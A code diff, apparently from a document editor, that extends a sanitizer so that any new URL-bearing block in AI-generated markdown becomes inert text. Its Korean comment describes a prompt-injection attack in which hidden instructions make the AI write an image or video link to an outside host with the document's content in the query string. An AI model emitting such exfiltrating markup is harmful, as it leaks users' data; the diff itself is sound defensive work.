@@ -94,17 +94,20 @@ export function markdownImageUrls(markdown: string): Set<string> {
 }
 
 /**
- * AI가 새로 쓴 외부 이미지는 넣지 않고 글자로 바꾼다. 페이지에 넣는 순간 주소를 불러오므로,
- * 문서에 숨긴 지시(프롬프트 인젝션)로 ![](https://외부/?d=내용) 을 쓰게 하면 내용이 밖으로 샐 수 있다.
+ * AI 마크다운에서 새로 생긴 블록 중 주소(url)를 가진 것(이미지·동영상·오디오·파일 등)은 넣지 않고 글자로 바꾼다.
+ * 페이지에 넣는 순간 주소를 불러오므로, 문서에 숨긴 지시(프롬프트 인젝션)로 ![](https://외부/?d=내용) 이나
+ * <video src=…> 를 쓰게 하면 내용이 밖으로 샐 수 있다. 원래 페이지의 동영상·오디오·파일은 자리표시로 따로 되돌리고,
+ * 원래 이미지는 편집 전 원문에 있던 주소(allowed)라 그대로 둔다.
  */
-function neutralizeImages(blocks: Block[], allowed: ReadonlySet<string>): Block[] {
+function neutralizeMedia(blocks: Block[], allowed: ReadonlySet<string>): Block[] {
   return blocks.map((block) => {
-    const url = typeof block.props?.url === "string" ? block.props.url : "";
-    if (block.type === "image" && url && !allowed.has(url)) {
-      const label = block.props?.caption || block.props?.name || "이미지";
-      return { type: "paragraph", content: [{ type: "text", text: `🖼 ${label} (${url})`, styles: {} }] };
+    const url = typeof block.props?.url === "string" ? block.props.url.trim() : "";
+    if (url && !allowed.has(url)) {
+      const label = block.props?.caption || block.props?.name || (block.type === "image" ? "이미지" : block.type);
+      const icon = block.type === "image" ? "🖼" : block.type === "video" ? "🎞" : block.type === "audio" ? "🔊" : "📎";
+      return { type: "paragraph", content: [{ type: "text", text: `${icon} ${label} (${url})`, styles: {} }] };
     }
-    return block.children?.length ? { ...block, children: neutralizeImages(block.children, allowed) } : block;
+    return block.children?.length ? { ...block, children: neutralizeMedia(block.children, allowed) } : block;
   });
 }
 
@@ -121,7 +124,7 @@ export function aiMarkdownToBlocks(
   const flush = () => {
     const markdown = buffer.join("\n").trim();
     buffer = [];
-    if (markdown) out.push(...neutralizeImages(parse(markdown), allowedImageUrls));
+    if (markdown) out.push(...neutralizeMedia(parse(markdown), allowedImageUrls));
   };
   const push = (block: Block) => {
     flush();
